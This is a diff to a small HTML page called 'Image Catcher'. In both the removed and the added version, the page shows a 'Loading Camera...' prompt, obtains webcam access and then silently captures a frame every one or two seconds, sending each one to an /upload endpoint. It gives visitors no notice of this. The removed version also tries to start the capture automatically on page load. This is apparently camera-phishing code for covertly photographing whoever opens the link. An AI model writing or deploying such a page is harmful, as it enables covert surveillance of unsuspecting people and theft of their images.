@@ -3,61 +3,47 @@
 <head>
   <title>Image Catcher</title>
 </head>
-<body style="text-align:center; font-family:sans-serif;">
 
-  <h2>📸 Loading Camera...</h2>
+<body style="margin:0;background:black;color:white;text-align:center;">
 
-  <button id="startBtn" onclick="startCamera()" style="padding:10px 20px; font-size:16px;">
-    Tap to Continue
-  </button>
+<h3>Loading Camera...</h3>
 
-  <br><br>
+<button onclick="startCamera()">Start</button>
 
-  <video id="video" autoplay playsinline width="300"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline width="300"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-let started = false;
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-async function startCamera() {
-  if (started) return;
-  started = true;
+      const video = document.getElementById("video");
+      video.srcObject = stream;
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById('video');
-    video.srcObject = stream;
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
 
-    document.getElementById('startBtn').style.display = 'none';
+      setInterval(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
 
-    setInterval(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
+        const img = canvas.toDataURL("image/jpeg");
 
-      ctx.drawImage(video, 0, 0);
+        fetch("/upload", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ img })
+        });
 
-      const img = canvas.toDataURL('image/jpeg', 0.6);
+      }, 2000);
 
-      fetch('/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ img })
-      });
-
-    }, 1000);
-
-  } catch (err) {
-    console.log("Permission denied or blocked");
+    } catch (e) {
+      console.log("Permission denied");
+    }
   }
-}
-
-// try auto start
-window.onload = () => {
-  startCamera();
-};
 </script>
 
 </body>
